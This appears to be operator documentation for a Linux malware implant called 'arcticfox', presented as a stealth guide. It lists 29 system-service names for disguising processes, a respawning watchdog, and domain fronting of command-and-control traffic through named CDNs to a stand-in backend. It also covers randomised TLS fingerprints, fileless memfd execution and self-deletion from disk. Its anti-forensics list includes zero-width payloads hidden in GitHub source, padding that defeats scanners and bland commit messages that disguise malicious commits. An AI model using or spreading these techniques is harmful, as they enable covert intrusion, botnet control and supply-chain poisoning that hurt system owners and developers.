# Stealth Guide

## Process Camouflage

The implant disguises itself as a common system service. 29 names available:

```
sshd, httpd, nginx, ftpd, cron, crond, dbus-daemon,
systemd-journald, systemd-udevd, systemd-logind,
systemd-resolved, rsyslogd, auditd, atd, agetty,
dhclient, ntpd, containerd, dockerd, kubelet,
java, node, python3, php-fpm, mysqld, postgres,
redis-server, apache2, [sshd:] (child process)
```

Set via `--stealth-name` or automatically rotated.

### How it works

- `prctl(PR_SET_NAME)` sets `/proc/self/comm` — what `ps` and `top` display
- Watchdog respawns implant under a DIFFERENT name each time
- PID files written to `/var/run/sshd.pid`, `/var/run/crond.pid`, etc.

### Watchdog

```bash
./arcticfox-agent agent --daemon  # spawns watchdog automatically
```

Watchdog monitors parent PID every 5s. On death: respawns with new name.

## Domain Fronting

Route C2 traffic through CDN edge servers. TLS SNI shows `cdn.cloudflare.com`,
HTTP Host header targets actual C2 backend.

```rust
let df = DomainFront {
    front_domain: "cdn.cloudflare.com".into(),
    backend_host: "c2.example.com".into(),
    path_prefix: "/api".into(),
};
```

Supported CDNs: Cloudflare, Fastly, Akamai, Azure, AWS CloudFront, Google APIs.

## TLS Fingerprint Randomization

Each C2 connection gets a different JARM/JA3 fingerprint — indistinguishable
from diverse browser traffic. Profiles: Chrome, Firefox, Safari, Edge.

```rust
let fp = TlsFingerprint::random_browser();
// Randomizes cipher suites, extensions, elliptic curves per connection
```

## Fileless Execution (memfd_create)

Binary never touches disk. Written to anonymous in-memory file, executed via
`/proc/self/fd/N`. Invisible to `ls`, `find`, file-based AV.

```rust
arcticfox_uring::memfd_exec(&implant_bytes, &["--daemon"]);
```

## Self-Unlink

Binary deleted from disk after launch. Inode stays alive until process exits.

```rust
arcticfox_agent::stealth::unlink_self();
```

## Bot ID Camouflage

Bot IDs look like server hostnames, not random hex:
`web01, db01, cache01, worker01, proxy01, k8s-node01, srv02...`

## Anti-Forensics

- ZW payloads are invisible in GitHub UI — only visible in raw source
- Optional 1MB ZW padding after payload (computationally expensive to scan)
- Heartbeat via open redirect — C2 IP never exposed to bot
- Randomized polling jitter prevents timing correlation
- Bland commit messages: "docs: update readme", "fix typo in readme"
- Cache-busting on all fetches prevents caching proxies from detecting pattern
